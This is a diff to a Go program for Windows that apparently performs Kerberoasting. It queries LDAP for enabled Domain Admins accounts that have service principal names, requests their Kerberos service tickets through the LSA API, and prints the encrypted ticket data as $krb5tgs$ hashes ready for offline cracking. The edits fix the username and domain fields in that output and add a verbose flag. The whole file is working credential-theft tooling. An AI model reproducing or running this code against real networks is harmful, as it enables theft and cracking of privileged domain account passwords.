@@ -1,12 +1,15 @@
 package main
 
 //go:generate go run golang.org/x/sys/windows/mkwinsyscall -output syscallwin.go main.go
-
 import (
 	_ "embed"
 	"encoding/hex"
+	"flag"
 	"fmt"
+	"io/ioutil"
+	"log"
 	"math"
+	"os"
 	"regexp"
 	"strconv"
 	"unsafe"
@@ -27,18 +30,12 @@ import (
 //sys ldap_next_attribute(ld uintptr, entry uintptr, ber uintptr) (ret *uint8) = Wldap32.ldap_next_attribute
 //sys ldap_count_valuesA(vals **uint8) (ret uint64) = Wldap32.ldap_count_values
 //sys ldap_memfree(block *uint8) = Wldap32.ldap_memfree
-
 //sys LsaConnectUntrusted(lsaHandle *uintptr) (ret uint32) = Secur32.LsaConnectUntrusted
 //sys LsaDeregisterLogonProcess(lsaHandle uintptr) (ret uint32) = Secur32.LsaDeregisterLogonProcess
 //sys LsaLookupAuthenticationPackage(lsaHandle uintptr, packageName *LSA_STRING, authenticationPackage *uint32) (ret uint32) = Secur32.LsaLookupAuthenticationPackage
 //sys LsaCallAuthenticationPackage(lsaHandle uintptr, authenticationPackage uint32, protocolSubmitBuffer uintptr, submitBufferLength uint32, protocolReturnBuffer *uintptr, returnBufferLength *uint32, pNTSTATUS *uint32) (ret uint32) = Secur32.LsaCallAuthenticationPackage
-
 //sys GetComputerNameExA(nametype uint32, buf unsafe.Pointer, n *uint32) (err error) = Kernel32.GetComputerNameExA
-
-type LdapServer struct {
-	host string
-	port uint64
-}
+var verbose bool
 
 const (
 	UF_ACCOUNT_DISABLE                  uint64 = 2
@@ -57,18 +54,21 @@ const (
 	ticketFlags                         uint32 = KerbForwardable | KerbForwarded | KerbRenewable | KerbPre_authent
 )
 
+type LdapServer struct {
+	host string
+	port uint64
+}
 type User struct {
 	sAMAccountName       string
 	distinguishedName    string
 	servicePrincipalName string
+	domainName           string
 }
-
 type LSA_STRING struct {
 	length        int16
 	maximumLength int16
 	buffer        *byte
 }
-
 type KERB_RETRIEVE_TKT_REQUEST struct {
 	messageType       uint32
 	logonId           windows.LUID
@@ -81,7 +81,6 @@ type KERB_RETRIEVE_TKT_REQUEST struct {
 type KERB_RETRIEVE_TKT_RESPONSE struct {
 	ticket KERB_EXTERNAL_TICKET
 }
-
 type KERB_EXTERNAL_TICKET struct {
 	serviceName         uintptr //PKERB_EXTERNAL_NAME
 	targetName          uintptr //PKERB_EXTERNAL_NAME
@@ -105,13 +104,11 @@ type KERB_EXTERNAL_NAME struct {
 	nameCount uint16
 	names     []windows.NTUnicodeString
 }
-
 type KERB_CRYPTO_KEY struct {
 	keyType int32
 	length  uint32
 	value   *uint8
 }
-
 type SecHandle struct {
 	dwLower uintptr
 	dwUpper uintptr
@@ -136,7 +133,6 @@ func getDomainSPNTicket(user User) {
 	if LsaConnectUntrusted(&hLsa) != STATUS_SUCCESS {
 		panic("KerberosTicketsManger::InitializeConnection: LsaConnectUntrusted failed")
 	}
-
 	lsaStrAuthPkgLangth := int16(len(MICROSOFT_KERBEROS_NAME_A))
 	lsaStrAuthPkgMaxLangth := int16(len(MICROSOFT_KERBEROS_NAME_A))
 	// lsaStrAuthPkgBuffer := make([]byte, lsaStrAuthPkgLangth)
@@ -157,7 +153,6 @@ func getDomainSPNTicket(user User) {
 	}
 	luid := windows.LUID{LowPart: 0, HighPart: 0}
 	hSec := SecHandle{dwLower: 0, dwUpper: 0}
-
 	krbTmp := make([]byte, int(unsafe.Sizeof(KERB_RETRIEVE_TKT_RESPONSE{}))+((len(spn))*2))
 	siz := int(unsafe.Sizeof(KERB_RETRIEVE_TKT_RESPONSE{})) + ((len(spn)) * 2)
 	kerbRetrieveTktRequest := (*KERB_RETRIEVE_TKT_REQUEST)(unsafe.Pointer(&krbTmp[0]))
@@ -175,7 +170,6 @@ func getDomainSPNTicket(user User) {
 		*(*uint16)(unsafe.Add((unsafe.Pointer(&krbTmp[0])), int(unsafe.Sizeof(KERB_RETRIEVE_TKT_REQUEST{}))+(i*2))) = tmp
 	}
 	// fmt.Printf("utf16length: %d  length: %d\n", target.Length, len(spn))
-
 	kerbRetrieveTktRequest.messageType = KerbRetrieveEncodedTicketMessage
 	kerbRetrieveTktRequest.logonId = luid
 	kerbRetrieveTktRequest.targetName = target
@@ -191,7 +185,6 @@ func getDomainSPNTicket(user User) {
 	responseLen := uint32(math.MaxUint32)
 	protocolStatus := STATUS_ACCESS_DENIED
 	ticketsStatus = LsaCallAuthenticationPackage(hLsa, authPkgId, protocolSubmitBuffer, submitBufferLength, &protocolReturnBuffer, &responseLen, &protocolStatus)
-
 	if ticketsStatus != STATUS_SUCCESS {
 		panic("KerberosTicketsManger::RequestTicketFromSystem: LsaCallAuthenticationPackage failed")
 	}
@@ -205,30 +198,27 @@ func getDomainSPNTicket(user User) {
 		tmp := *(*byte)(unsafe.Add(unsafe.Pointer(protocolReturnBufferRaw.ticket.encodedTicket), offset))
 		encodedTicket = append(encodedTicket, tmp)
 	}
-
 	ticketHexStream := hex.EncodeToString(encodedTicket)
 	reg := regexp.MustCompile("a382....3082....a0030201(..)a1.{1,4}.......a282(....)........(.+)")
 	group := reg.FindAllStringSubmatch(ticketHexStream, -1)
-
 	eType, _ := strconv.ParseInt(group[0][1], 16, 64)             //binary.BigEndian.Uint64(eTypeByte)
 	cipherTextLenBase, _ := strconv.ParseInt(group[0][2], 16, 64) //binary.BigEndian.Uint64(eTypeByte)
 	cipherTextLen := int(cipherTextLenBase - 4)
 	dataToEnd := group[0][3]
 	cipherText := dataToEnd[:cipherTextLen*2]
-	fmt.Printf("$krb5tgs$%d$*%s$%s$%s*$%s$%s\n", eType, "user", "domain", spn, cipherText[:32], cipherText[32:])
+	fmt.Printf("$krb5tgs$%d$*%s$%s$%s*$%s$%s\n", eType, user.sAMAccountName, user.domainName, spn, cipherText[:32], cipherText[32:])
 }
 
 func kerberoast() []User {
 	var nameType uint32 = windows.ComputerNameDnsDomain
 	var bufSize uint32 = 0
-
 	GetComputerNameExA(nameType, nil, &bufSize)
 	hostNameByte := make([]uint8, bufSize)
 	GetComputerNameExA(nameType, unsafe.Pointer(&hostNameByte[0]), &bufSize)
 	hostName := string(hostNameByte[:len(hostNameByte)-1])
 	ls := LdapServer{hostName, LDAP_PORT}
 	baseDN := ls.ldapGetBase()
-	// filter := "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))"
+	// filter := "(&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
 	filter := fmt.Sprintf("("+
 		"&(samAccountType=805306368)"+ //all user objects
 		"(servicePrincipalName=*)"+ //SPN
@@ -236,14 +226,15 @@ func kerberoast() []User {
 		"(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))"+ //without disabled accounts
 		"(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,%s)"+ //member of Domain Admins
 		")", UF_ACCOUNT_DISABLE, baseDN)
-	res := ls.ldapSearch(filter, baseDN)
+	res := ls.ldapSearch(baseDN, filter)
 	var users []User
 	for _, r := range res {
-		samAccountName := r["samAccountName"][0]
+		samAccountName := r["sAMAccountName"][0]
 		distinguishedName := r["distinguishedName"][0]
 		user := User{
 			sAMAccountName:    samAccountName,
 			distinguishedName: distinguishedName,
+			domainName:        hostName,
 		}
 		for _, spn := range r["servicePrincipalName"] {
 			user.servicePrincipalName = spn
@@ -251,6 +242,16 @@ func kerberoast() []User {
 		}
 	}
 	return users
+}
+
+func init() {
+	flag.BoolVar(&verbose, "verbose", false, "Print debug message.")
+	flag.Parse()
+	if verbose {
+		log.SetOutput(os.Stderr)
+	} else {
+		log.SetOutput(ioutil.Discard)
+	}
 }
 
 func main() {
